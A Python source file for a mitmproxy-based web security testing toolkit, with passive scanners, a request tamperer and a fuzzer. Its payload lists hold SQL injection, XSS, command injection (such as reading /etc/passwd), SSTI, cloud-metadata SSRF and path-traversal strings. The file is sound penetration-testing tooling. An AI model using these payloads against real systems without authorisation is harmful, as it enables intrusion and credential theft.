#!/usr/bin/env python3
"""
Durpie v2 - Web Security Testing Toolkit powered by mitmproxy
=============================================================

A modular security testing framework built on top of mitmproxy.

Installation:
    pip install mitmproxy

Usage:
    # Start proxy with all addons
    mitmdump -s durpie.py
    
    # Start with specific addon
    mitmdump -s "durpie.py --addon sqli"
    
    # Start web interface
    mitmweb -s durpie.py

⚠️  Only use against systems you own or have explicit permission to test.
"""

import re
import json
import base64
import hashlib
import urllib.parse
import threading
import asyncio
from datetime import datetime
from typing import Optional, List, Dict, Callable, Any
from dataclasses import dataclass, field
from collections import defaultdict
from pathlib import Path
import logging

# mitmproxy imports
try:
    from mitmproxy import http, ctx, options
    from mitmproxy.tools.main import mitmdump, mitmweb
    from mitmproxy.script import concurrent
    from mitmproxy.net.http import Headers
    MITMPROXY_AVAILABLE = True
except ImportError:
    MITMPROXY_AVAILABLE = False
    # Create dummy classes for type hints when mitmproxy not installed
    class DummyHTTP:
        class HTTPFlow:
            pass
    http = DummyHTTP()
    ctx = None
    print("[!] mitmproxy not installed. Run: pip install mitmproxy")


# ============================================================
# UTILITIES
# ============================================================

class Decoder:
    """Encoder/Decoder utility for payload transformation"""
    
    @staticmethod
    def url_encode(text: str, safe: str = '') -> str:
        return urllib.parse.quote(text, safe=safe)
    
    @staticmethod
    def url_decode(text: str) -> str:
        return urllib.parse.unquote(text)
    
    @staticmethod
    def double_url_encode(text: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(text, safe=''), safe='')
    
    @staticmethod
    def base64_encode(text: str) -> str:
        return base64.b64encode(text.encode()).decode()
    
    @staticmethod
    def base64_decode(text: str) -> str:
        # Handle padding
        padding = 4 - len(text) % 4
        if padding != 4:
            text += "=" * padding
        return base64.b64decode(text).decode()
    
    @staticmethod
    def html_encode(text: str) -> str:
        import html
        return html.escape(text)
    
    @staticmethod
    def html_decode(text: str) -> str:
        import html
        return html.unescape(text)
    
    @staticmethod
    def hex_encode(text: str) -> str:
        return text.encode().hex()
    
    @staticmethod
    def hex_decode(text: str) -> str:
        return bytes.fromhex(text).decode()
    
    @staticmethod
    def unicode_encode(text: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' for c in text)
    
    @staticmethod
    def md5(text: str) -> str:
        return hashlib.md5(text.encode()).hexdigest()
    
    @staticmethod
    def sha1(text: str) -> str:
        return hashlib.sha1(text.encode()).hexdigest()
    
    @staticmethod
    def sha256(text: str) -> str:
        return hashlib.sha256(text.encode()).hexdigest()


class PayloadManager:
    """Manages attack payloads"""
    
    # SQL Injection
    SQLI_DETECTION = [
        "'", "''", '"', "\\", 
        "1' OR '1'='1", "1 OR 1=1",
        "' OR ''='", "\" OR \"\"=\"",
        "1' AND '1'='2", "1 AND 1=2",
        "' WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5);--",
    ]
    
    SQLI_AUTH_BYPASS = [
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "admin'#",
        "') OR ('1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "') OR '1'='1'--",
        "' OR 'x'='x",
        "' OR 1=1 LIMIT 1--",
    ]
    
    SQLI_UNION = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
    ]
    
    SQLI_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"PostgreSQL.*ERROR",
        r"ORA-\d{5}",
        r"Microsoft.*ODBC.*SQL Server",
        r"SQLite.*error",
        r"Unclosed quotation mark",
        r"SQLSTATE\[",
        r"pg_query\(\)",
        r"System\.Data\.SqlClient",
    ]
    
    # XSS
    XSS_BASIC = [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "javascript:alert(1)",
        "<a href='javascript:alert(1)'>click</a>",
    ]
    
    XSS_FILTER_BYPASS = [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert&#40;1&#41;>",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
    ]
    
    XSS_POLYGLOT = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
    ]
    
    # Command Injection
    CMDI_PAYLOADS = [
        "; ls", "| ls", "& ls", "&& ls",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "& dir", "| dir",
        "; sleep 5", "| sleep 5",
        "`ls`", "$(ls)",
        ";${IFS}ls",
    ]
    
    # SSTI
    SSTI_DETECTION = [
        "${7*7}", "{{7*7}}", "<%= 7*7 %>",
        "#{7*7}", "*{7*7}", "@(7*7)",
        "{{config}}", "${T(java.lang.Runtime)}",
    ]
    
    # SSRF
    SSRF_LOCALHOST = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://0177.0.0.1",
        "http://2130706433",
        "http://0x7f.0x0.0x0.0x1",
    ]
    
    SSRF_CLOUD_METADATA = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ]
    
    # Path Traversal
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    ]
    
    @classmethod
    def load_from_file(cls, filepath: str) -> List[str]:
        """Load payloads from wordlist file"""
        with open(filepath, 'r', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]


class FlowStore:
    """Stores and manages captured flows"""
    
    def __init__(self):
        self.flows: List[Dict] = []
        self.lock = threading.Lock()
        self._id = 0
    
    def add(self, flow: 'http.HTTPFlow') -> int:
        with self.lock:
            self._id += 1
            entry = {
                'id': self._id,
                'timestamp': datetime.now().isoformat(),
                'method': flow.request.method,
                'url': flow.request.pretty_url,
                'host': flow.request.host,
                'path': flow.request.path,
                'request_headers': dict(flow.request.headers),
                'request_body': flow.request.get_text(),
                'status_code': flow.response.status_code if flow.response else None,
                'response_headers': dict(flow.response.headers) if flow.response else {},
                'response_length': len(flow.response.content) if flow.response else 0,
            }
            self.flows.append(entry)
            return self._id
    
    def search(self, pattern: str) -> List[Dict]:
        regex = re.compile(pattern, re.IGNORECASE)
        return [f for f in self.flows if regex.search(f['url']) or regex.search(f.get('request_body', ''))]
    
    def get_by_id(self, flow_id: int) -> Optional[Dict]:
        for f in self.flows:
            if f['id'] == flow_id:
                return f
        return None
    
    def export_json(self, filepath: str):
        with open(filepath, 'w') as f:
            json.dump(self.flows, f, indent=2)
    
    def clear(self):
        with self.lock:
            self.flows = []
            self._id = 0


# Global store
flow_store = FlowStore()


# ============================================================
# MITMPROXY ADDONS
# ============================================================

class DurpieBase:
    """Base addon with common utilities"""
    
    def __init__(self):
        self.decoder = Decoder()
        self.findings: List[Dict] = []
    
    def log(self, msg: str, level: str = "info"):
        """Log message through mitmproxy context"""
        if MITMPROXY_AVAILABLE:
            if level == "warn":
                ctx.log.warn(f"[Durpie] {msg}")
            elif level == "error":
                ctx.log.error(f"[Durpie] {msg}")
            else:
                ctx.log.info(f"[Durpie] {msg}")
        else:
            print(f"[Durpie] {msg}")
    
    def add_finding(self, finding: Dict):
        """Record a security finding"""
        finding['timestamp'] = datetime.now().isoformat()
        self.findings.append(finding)
        self.log(f"FINDING: {finding.get('type')} - {finding.get('detail', '')}", "warn")
    
    def get_params(self, flow: 'http.HTTPFlow') -> Dict[str, str]:
        """Extract all parameters from request"""
        params = {}
        
        # Query params
        for key, value in flow.request.query.items():
            params[f"query:{key}"] = value
        
        # Body params (form)
        if flow.request.urlencoded_form:
            for key, value in flow.request.urlencoded_form.items():
                params[f"body:{key}"] = value
        
        # JSON body
        try:
            json_body = flow.request.json()
            if isinstance(json_body, dict):
                for key, value in json_body.items():
                    params[f"json:{key}"] = str(value)
        except:
            pass
        
        return params


class HistoryAddon(DurpieBase):
    """Records all traffic - like Burp's HTTP History"""
    
    def __init__(self):
        super().__init__()
        self.store = flow_store
    
    def response(self, flow: http.HTTPFlow):
        flow_id = self.store.add(flow)
        self.log(f"[{flow_id}] {flow.request.method} {flow.request.pretty_url} -> {flow.response.status_code}")


class SQLiScanner(DurpieBase):
    """Automatic SQL Injection detection"""
    
    def __init__(self, active: bool = False):
        super().__init__()
        self.active = active  # If True, actively injects payloads
        self.tested_params = set()
    
    def response(self, flow: http.HTTPFlow):
        """Check responses for SQL errors (passive)"""
        if not flow.response:
            return
        
        body = flow.response.get_text()
        for pattern in PayloadManager.SQLI_ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                self.add_finding({
                    'type': 'SQL Error Disclosure',
                    'severity': 'MEDIUM',
                    'url': flow.request.pretty_url,
                    'evidence': pattern,
                })
    
    def request(self, flow: http.HTTPFlow):
        """Actively test parameters for SQLi"""
        if not self.active:
            return
        
        params = self.get_params(flow)
        for param_name, param_value in params.items():
            param_key = f"{flow.request.host}:{flow.request.path}:{param_name}"
            if param_key in self.tested_params:
                continue
            
            self.tested_params.add(param_key)
            self.log(f"Testing SQLi on {param_name}")


class XSSScanner(DurpieBase):
    """XSS detection - checks if input is reflected"""
    
    def __init__(self):
        super().__init__()
        self.pending_tests: Dict[str, Dict] = {}
    
    def request(self, flow: http.HTTPFlow):
        """Track input values for reflection detection"""
        params = self.get_params(flow)
        for param_name, param_value in params.items():
            if len(param_value) > 3:  # Only track meaningful values
                self.pending_tests[param_value] = {
                    'param': param_name,
                    'url': flow.request.pretty_url,
                }
    
    def response(self, flow: http.HTTPFlow):
        """Check if any tracked values are reflected"""
        if not flow.response:
            return
        
        body = flow.response.get_text()
        
        for value, info in list(self.pending_tests.items()):
            if value in body:
                # Check if it's reflected without encoding
                self.add_finding({
                    'type': 'Potential XSS (Reflected Input)',
                    'severity': 'LOW',
                    'url': info['url'],
                    'parameter': info['param'],
                    'reflected_value': value[:50],
                })
                
                # Test with XSS payload
                for payload in ['<script>', '<img', 'onerror=']:
                    if payload in value and payload in body:
                        self.add_finding({
                            'type': 'Reflected XSS',
                            'severity': 'HIGH',
                            'url': info['url'],
                            'parameter': info['param'],
                            'payload': value[:100],
                        })


class SensitiveDataScanner(DurpieBase):
    """Detect sensitive data in responses"""
    
    PATTERNS = {
        'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
        'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
        'credit_card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
        'api_key': r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']?[\w-]{20,}',
        'aws_key': r'(?i)AKIA[0-9A-Z]{16}',
        'private_key': r'-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----',
        'jwt': r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+',
        'password_field': r'(?i)(password|passwd|pwd)\s*[:=]\s*["\']?[^"\'&\s]{4,}',
        'internal_ip': r'\b(?:10\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b',
    }
    
    def response(self, flow: http.HTTPFlow):
        if not flow.response:
            return
        
        # Skip binary content
        content_type = flow.response.headers.get('content-type', '')
        if any(t in content_type for t in ['image/', 'video/', 'audio/', 'octet-stream']):
            return
        
        body = flow.response.get_text()
        
        for data_type, pattern in self.PATTERNS.items():
            matches = re.findall(pattern, body)
            if matches:
                self.add_finding({
                    'type': 'Sensitive Data Exposure',
                    'severity': 'MEDIUM',
                    'data_type': data_type,
                    'url': flow.request.pretty_url,
                    'count': len(matches),
                    'sample': str(matches[0])[:50] if matches else '',
                })


class SecurityHeadersAudit(DurpieBase):
    """Check for missing security headers"""
    
    REQUIRED_HEADERS = {
        'Strict-Transport-Security': 'HSTS not set - vulnerable to downgrade attacks',
        'Content-Security-Policy': 'CSP not set - vulnerable to XSS',
        'X-Frame-Options': 'X-Frame-Options not set - vulnerable to clickjacking',
        'X-Content-Type-Options': 'X-Content-Type-Options not set - MIME sniffing possible',
        'X-XSS-Protection': 'X-XSS-Protection not set (legacy browser protection)',
        'Referrer-Policy': 'Referrer-Policy not set - referer leakage possible',
    }
    
    INSECURE_VALUES = {
        'Access-Control-Allow-Origin': ['*'],
        'X-Frame-Options': ['ALLOWALL'],
    }
    
    def __init__(self):
        super().__init__()
        self.checked_hosts = set()
    
    def response(self, flow: http.HTTPFlow):
        if not flow.response:
            return
        
        # Only check once per host
        host = flow.request.host
        if host in self.checked_hosts:
            return
        self.checked_hosts.add(host)
        
        # Check missing headers
        for header, message in self.REQUIRED_HEADERS.items():
            if header.lower() not in [h.lower() for h in flow.response.headers.keys()]:
                self.add_finding({
                    'type': 'Missing Security Header',
                    'severity': 'LOW',
                    'host': host,
                    'header': header,
                    'detail': message,
                })
        
        # Check insecure values
        for header, bad_values in self.INSECURE_VALUES.items():
            value = flow.response.headers.get(header, '')
            if value in bad_values:
                self.add_finding({
                    'type': 'Insecure Header Value',
                    'severity': 'MEDIUM',
                    'host': host,
                    'header': header,
                    'value': value,
                })


class CookieAudit(DurpieBase):
    """Audit cookie security attributes"""
    
    def __init__(self):
        super().__init__()
        self.checked_cookies = set()
    
    def response(self, flow: http.HTTPFlow):
        if not flow.response:
            return
        
        for cookie in flow.response.cookies.items(multi=True):
            name, (value, attrs) = cookie[0], (cookie[1], {})
            
            # Parse Set-Cookie header manually for attributes
            set_cookie = flow.response.headers.get('set-cookie', '')
            
            cookie_key = f"{flow.request.host}:{name}"
            if cookie_key in self.checked_cookies:
                continue
            self.checked_cookies.add(cookie_key)
            
            issues = []
            
            if 'Secure' not in set_cookie:
                issues.append('Missing Secure flag')
            
            if 'HttpOnly' not in set_cookie:
                issues.append('Missing HttpOnly flag')
            
            if 'SameSite' not in set_cookie:
                issues.append('Missing SameSite attribute')
            
            # Check for sensitive cookie names without protection
            sensitive_names = ['session', 'token', 'auth', 'jwt', 'csrf']
            is_sensitive = any(s in name.lower() for s in sensitive_names)
            
            if issues and is_sensitive:
                self.add_finding({
                    'type': 'Insecure Cookie',
                    'severity': 'MEDIUM',
                    'host': flow.request.host,
                    'cookie_name': name,
                    'issues': issues,
                })


class JWTAnalyzer(DurpieBase):
    """Analyze and detect JWT vulnerabilities"""
    
    def __init__(self):
        super().__init__()
        self.seen_tokens = set()
    
    def decode_jwt(self, token: str) -> Optional[Dict]:
        """Decode JWT without verification"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            header = json.loads(self.decoder.base64_decode(parts[0]))
            payload = json.loads(self.decoder.base64_decode(parts[1]))
            
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2]
            }
        except:
            return None
    
    def request(self, flow: http.HTTPFlow):
        """Analyze JWTs in requests"""
        # Check Authorization header
        auth = flow.request.headers.get('Authorization', '')
        if auth.startswith('Bearer '):
            token = auth.split(' ', 1)[1]
            self.analyze_token(token, flow.request.pretty_url)
        
        # Check cookies
        for name, value in flow.request.cookies.items():
            if self.looks_like_jwt(value):
                self.analyze_token(value, flow.request.pretty_url)
    
    def looks_like_jwt(self, value: str) -> bool:
        """Check if value looks like a JWT"""
        return bool(re.match(r'^eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$', value))
    
    def analyze_token(self, token: str, url: str):
        """Analyze JWT for vulnerabilities"""
        if token in self.seen_tokens:
            return
        self.seen_tokens.add(token)
        
        decoded = self.decode_jwt(token)
        if not decoded:
            return
        
        header = decoded['header']
        payload = decoded['payload']
        
        # Check algorithm
        alg = header.get('alg', '')
        
        if alg.lower() == 'none':
            self.add_finding({
                'type': 'JWT Algorithm None',
                'severity': 'CRITICAL',
                'url': url,
                'detail': 'JWT uses "none" algorithm - no signature verification',
            })
        
        if alg == 'HS256':
            self.add_finding({
                'type': 'JWT Weak Algorithm',
                'severity': 'LOW',
                'url': url,
                'detail': 'JWT uses HS256 - susceptible to brute force if weak secret',
            })
        
        # Check for sensitive data in payload
        sensitive_fields = ['password', 'secret', 'key', 'credit_card', 'ssn']
        for field in sensitive_fields:
            if field in str(payload).lower():
                self.add_finding({
                    'type': 'Sensitive Data in JWT',
                    'severity': 'MEDIUM',
                    'url': url,
                    'detail': f'JWT payload may contain sensitive field: {field}',
                })
        
        # Check expiration
        import time
        exp = payload.get('exp')
        if exp:
            if exp < time.time():
                self.add_finding({
                    'type': 'Expired JWT Accepted',
                    'severity': 'MEDIUM',
                    'url': url,
                    'detail': 'Server accepted expired JWT token',
                })
        else:
            self.add_finding({
                'type': 'JWT Missing Expiration',
                'severity': 'LOW',
                'url': url,
                'detail': 'JWT has no expiration claim',
            })
        
        self.log(f"JWT analyzed: alg={alg}, claims={list(payload.keys())}")


class IDORDetector(DurpieBase):
    """Detect potential IDOR vulnerabilities"""
    
    # Patterns that often indicate resource IDs
    ID_PATTERNS = [
        r'[?&/]id[=/](\d+)',
        r'[?&/]user[_-]?id[=/](\d+)',
        r'[?&/]account[_-]?id[=/](\d+)',
        r'[?&/]order[_-]?id[=/](\d+)',
        r'[?&/]file[_-]?id[=/](\d+)',
        r'[?&/]doc[_-]?id[=/](\d+)',
        r'/users?/(\d+)',
        r'/accounts?/(\d+)',
        r'/orders?/(\d+)',
        r'/profiles?/(\d+)',
    ]
    
    def __init__(self):
        super().__init__()
        self.found_ids = defaultdict(set)
    
    def request(self, flow: http.HTTPFlow):
        """Track numeric IDs in requests"""
        url = flow.request.pretty_url
        
        for pattern in self.ID_PATTERNS:
            matches = re.findall(pattern, url, re.IGNORECASE)
            for match in matches:
                endpoint = re.sub(r'\d+', '{id}', flow.request.path)
                self.found_ids[endpoint].add(int(match))
    
    def response(self, flow: http.HTTPFlow):
        """Check for IDOR indicators"""
        if not flow.response:
            return
        
        url = flow.request.pretty_url
        
        for pattern in self.ID_PATTERNS:
            if re.search(pattern, url, re.IGNORECASE):
                # Flag for manual testing
                self.add_finding({
                    'type': 'Potential IDOR',
                    'severity': 'INFO',
                    'url': url,
                    'detail': 'Numeric ID in URL - test with different values',
                    'test': 'Try incrementing/decrementing the ID',
                })
                break


class SSRFDetector(DurpieBase):
    """Detect potential SSRF vulnerabilities"""
    
    URL_PARAMS = ['url', 'uri', 'path', 'dest', 'redirect', 'return', 
                  'next', 'target', 'link', 'feed', 'host', 'site']
    
    def request(self, flow: http.HTTPFlow):
        """Detect URL parameters that might be SSRF vectors"""
        params = self.get_params(flow)
        
        for param_name, param_value in params.items():
            clean_name = param_name.split(':')[-1].lower()
            
            # Check if param name suggests URL
            if any(url_param in clean_name for url_param in self.URL_PARAMS):
                self.add_finding({
                    'type': 'Potential SSRF Vector',
                    'severity': 'INFO',
                    'url': flow.request.pretty_url,
                    'parameter': param_name,
                    'value': param_value[:100],
                    'test': 'Try internal IPs: 127.0.0.1, 169.254.169.254',
                })
            
            # Check if value looks like URL
            if param_value.startswith(('http://', 'https://', '//')):
                self.add_finding({
                    'type': 'URL Parameter Detected',
                    'severity': 'INFO',
                    'url': flow.request.pretty_url,
                    'parameter': param_name,
                    'value': param_value[:100],
                    'test': 'Test for SSRF with internal URLs',
                })


class AuthBypassTester(DurpieBase):
    """Test for authentication bypass vulnerabilities"""
    
    def __init__(self):
        super().__init__()
        self.auth_endpoints = set()
        self.authenticated_paths = set()
    
    def response(self, flow: http.HTTPFlow):
        if not flow.response:
            return
        
        # Track endpoints that require auth (401/403)
        if flow.response.status_code in [401, 403]:
            self.auth_endpoints.add(flow.request.path)
            self.add_finding({
                'type': 'Protected Endpoint Found',
                'severity': 'INFO',
                'url': flow.request.pretty_url,
                'status': flow.response.status_code,
                'test': 'Try different HTTP methods, headers, path variations',
            })
        
        # Track successful authenticated requests
        if flow.response.status_code == 200:
            auth_header = flow.request.headers.get('Authorization', '')
            cookie = flow.request.headers.get('Cookie', '')
            
            if auth_header or 'session' in cookie.lower():
                self.authenticated_paths.add(flow.request.path)


class RequestTamperer(DurpieBase):
    """Modify requests on-the-fly for testing"""
    
    def __init__(self, rules: List[Dict] = None):
        super().__init__()
        self.rules = rules or []
        self.enabled = True
    
    def add_rule(self, rule: Dict):
        """
        Add tampering rule.
        
        Rule format:
        {
            'match': {'url': r'.*login.*', 'method': 'POST'},
            'modify': {
                'add_header': {'X-Admin': 'true'},
                'replace_body': {'role': 'admin'},
                'replace_param': {'user_id': '1'},
            }
        }
        """
        self.rules.append(rule)
    
    def request(self, flow: http.HTTPFlow):
        if not self.enabled:
            return
        
        for rule in self.rules:
            if self.matches(flow, rule.get('match', {})):
                self.apply_modifications(flow, rule.get('modify', {}))
    
    def matches(self, flow: http.HTTPFlow, match: Dict) -> bool:
        """Check if flow matches rule conditions"""
        if 'url' in match:
            if not re.search(match['url'], flow.request.pretty_url, re.IGNORECASE):
                return False
        
        if 'method' in match:
            if flow.request.method.upper() != match['method'].upper():
                return False
        
        if 'host' in match:
            if match['host'].lower() not in flow.request.host.lower():
                return False
        
        return True
    
    def apply_modifications(self, flow: http.HTTPFlow, modify: Dict):
        """Apply modifications to request"""
        if 'add_header' in modify:
            for key, value in modify['add_header'].items():
                flow.request.headers[key] = value
                self.log(f"Added header: {key}: {value}")
        
        if 'remove_header' in modify:
            for key in modify['remove_header']:
                if key in flow.request.headers:
                    del flow.request.headers[key]
                    self.log(f"Removed header: {key}")
        
        if 'replace_param' in modify:
            for key, value in modify['replace_param'].items():
                if key in flow.request.query:
                    flow.request.query[key] = value
                    self.log(f"Replaced query param: {key}={value}")


class Intruder(DurpieBase):
    """Automated fuzzing like Burp Intruder"""
    
    def __init__(self):
        super().__init__()
        self.attacks = []
        self.results = []
    
    def setup_attack(self, 
                     base_request: Dict,
                     positions: List[str],
                     payloads: List[str],
                     attack_type: str = 'sniper') -> str:
        """
        Setup an Intruder attack.
        
        Args:
            base_request: {method, url, headers, body}
            positions: List of parameter names to fuzz
            payloads: List of payloads to test
            attack_type: 'sniper', 'battering_ram', 'pitchfork', 'cluster_bomb'
        
        Returns:
            Attack ID
        """
        attack_id = f"attack_{len(self.attacks)}"
        
        attack = {
            'id': attack_id,
            'base_request': base_request,
            'positions': positions,
            'payloads': payloads,
            'attack_type': attack_type,
            'status': 'pending',
            'results': [],
        }
        
        self.attacks.append(attack)
        return attack_id
    
    def generate_requests(self, attack_id: str) -> List[Dict]:
        """Generate all requests for an attack"""
        attack = next((a for a in self.attacks if a['id'] == attack_id), None)
        if not attack:
            return []
        
        base = attack['base_request']
        positions = attack['positions']
        payloads = attack['payloads']
        attack_type = attack['attack_type']
        
        requests = []
        
        if attack_type == 'sniper':
            # Test each position with each payload, one at a time
            for pos in positions:
                for payload in payloads:
                    req = self._create_request(base, {pos: payload})
                    requests.append({
                        'request': req,
                        'position': pos,
                        'payload': payload,
                    })
        
        elif attack_type == 'battering_ram':
            # Same payload in all positions
            for payload in payloads:
                modifications = {pos: payload for pos in positions}
                req = self._create_request(base, modifications)
                requests.append({
                    'request': req,
                    'positions': positions,
                    'payload': payload,
                })
        
        return requests
    
    def _create_request(self, base: Dict, modifications: Dict) -> Dict:
        """Create modified request"""
        req = base.copy()
        
        # Modify URL params
        if '?' in req.get('url', ''):
            base_url, params = req['url'].split('?', 1)
            param_dict = dict(p.split('=', 1) for p in params.split('&') if '=' in p)
            
            for key, value in modifications.items():
                if key in param_dict:
                    param_dict[key] = self.decoder.url_encode(value)
            
            req['url'] = base_url + '?' + '&'.join(f"{k}={v}" for k, v in param_dict.items())
        
        # Modify body
        if req.get('body'):
            body = req['body']
            for key, value in modifications.items():
                body = re.sub(
                    f'{key}=[^&]*',
                    f'{key}={self.decoder.url_encode(value)}',
                    body
                )
            req['body'] = body
        
        return req


# ============================================================
# COMBINED ADDON - Loads all scanners
# ============================================================

class DurpieSuite:
    """Main Durpie addon that combines all scanners"""
    
    def __init__(self):
        self.history = HistoryAddon()
        self.sqli = SQLiScanner(active=False)
        self.xss = XSSScanner()
        self.sensitive = SensitiveDataScanner()
        self.headers = SecurityHeadersAudit()
        self.cookies = CookieAudit()
        self.jwt = JWTAnalyzer()
        self.idor = IDORDetector()
        self.ssrf = SSRFDetector()
        self.auth = AuthBypassTester()
        self.tamperer = RequestTamperer()
        self.intruder = Intruder()
        
        self.addons = [
            self.history,
            self.sqli,
            self.xss,
            self.sensitive,
            self.headers,
            self.cookies,
            self.jwt,
            self.idor,
            self.ssrf,
            self.auth,
            self.tamperer,
        ]
    
    def request(self, flow: http.HTTPFlow):
        for addon in self.addons:
            if hasattr(addon, 'request'):
                try:
                    addon.request(flow)
                except Exception as e:
                    ctx.log.error(f"Addon error in request: {e}")
    
    def response(self, flow: http.HTTPFlow):
        for addon in self.addons:
            if hasattr(addon, 'response'):
                try:
                    addon.response(flow)
                except Exception as e:
                    ctx.log.error(f"Addon error in response: {e}")
    
    def get_all_findings(self) -> List[Dict]:
        """Collect findings from all scanners"""
        findings = []
        for addon in self.addons:
            if hasattr(addon, 'findings'):
                findings.extend(addon.findings)
        return findings
    
    def export_findings(self, filepath: str):
        """Export all findings to JSON"""
        findings = self.get_all_findings()
        with open(filepath, 'w') as f:
            json.dump(findings, f, indent=2)
        ctx.log.info(f"Exported {len(findings)} findings to {filepath}")
    
    def print_summary(self):
        """Print findings summary"""
        findings = self.get_all_findings()
        
        by_severity = defaultdict(list)
        for f in findings:
            by_severity[f.get('severity', 'INFO')].append(f)
        
        print("\n" + "="*60)
        print("DURPIE SECURITY SCAN SUMMARY")
        print("="*60)
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            if by_severity[severity]:
                print(f"\n[{severity}] ({len(by_severity[severity])} findings)")
                for f in by_severity[severity][:5]:  # Show first 5
                    print(f"  - {f.get('type')}: {f.get('url', f.get('host', ''))[:60]}")
                if len(by_severity[severity]) > 5:
                    print(f"  ... and {len(by_severity[severity]) - 5} more")
        
        print("\n" + "="*60)
        print(f"Total: {len(findings)} findings")
        print("="*60 + "\n")


# ============================================================
# MITMPROXY ENTRY POINT
# ============================================================

# Create global instance for mitmproxy to load
durpie = DurpieSuite()

# Expose addons list for mitmproxy
addons = [durpie]


def start():
    """Called when mitmproxy starts"""
    ctx.log.info("""
    ╔═══════════════════════════════════════════════════════╗
    ║   DURPIE v2 - Security Testing Suite                  ║
    ║   Powered by mitmproxy                                ║
    ║                                                       ║
    ║   Active Scanners:                                    ║
    ║   • SQL Injection Detection                           ║
    ║   • XSS Reflection Detection                          ║
    ║   • Sensitive Data Scanner                            ║
    ║   • Security Headers Audit                            ║
    ║   • Cookie Security Audit                             ║
    ║   • JWT Analyzer                                      ║
    ║   • IDOR Detector                                     ║
    ║   • SSRF Detector                                     ║
    ║   • Auth Bypass Tester                                ║
    ╚═══════════════════════════════════════════════════════╝
    """)


def done():
    """Called when mitmproxy shuts down"""
    durpie.print_summary()
    durpie.export_findings("durpie_findings.json")
    flow_store.export_json("durpie_history.json")


# ============================================================
# STANDALONE CLI
# ============================================================

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Durpie v2 - Security Testing Suite")
    parser.add_argument("--port", "-p", type=int, default=8080, help="Proxy port")
    parser.add_argument("--web", "-w", action="store_true", help="Start web interface")
    parser.add_argument("--demo", action="store_true", help="Run demo/test mode")
    
    args = parser.parse_args()
    
    if args.demo:
        print("Running Durpie demo...")
        
        # Test Decoder
        d = Decoder()
        print(f"\nDecoder test:")
        print(f"  URL encode '<script>': {d.url_encode('<script>')}")
        print(f"  Base64 'admin:password': {d.base64_encode('admin:password')}")
        print(f"  MD5 'password': {d.md5('password')}")
        
        # Test PayloadManager
        print(f"\nPayloads loaded:")
        print(f"  SQLi detection: {len(PayloadManager.SQLI_DETECTION)} payloads")
        print(f"  XSS basic: {len(PayloadManager.XSS_BASIC)} payloads")
        print(f"  Command injection: {len(PayloadManager.CMDI_PAYLOADS)} payloads")
        
        # Test JWT decoder
        jwt_analyzer = JWTAnalyzer()
        test_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        decoded = jwt_analyzer.decode_jwt(test_jwt)
        print(f"\nJWT decode test:")
        print(f"  Header: {decoded['header']}")
        print(f"  Payload: {decoded['payload']}")
        
    elif MITMPROXY_AVAILABLE:
        print(f"""
╔═══════════════════════════════════════════════════════════╗
║   DURPIE v2 - Security Testing Suite                      ║
╚═══════════════════════════════════════════════════════════╝

Start with mitmproxy:

  # Terminal mode (recommended for scripts)
  mitmdump -s durpie.py -p {args.port}

  # Web interface
  mitmweb -s durpie.py -p {args.port}

  # Interactive console
  mitmproxy -s durpie.py -p {args.port}

Configure browser proxy: 127.0.0.1:{args.port}
Install CA cert: http://mitm.it (after configuring proxy)
        """)
    else:
        print("mitmproxy not installed. Run: pip install mitmproxy")
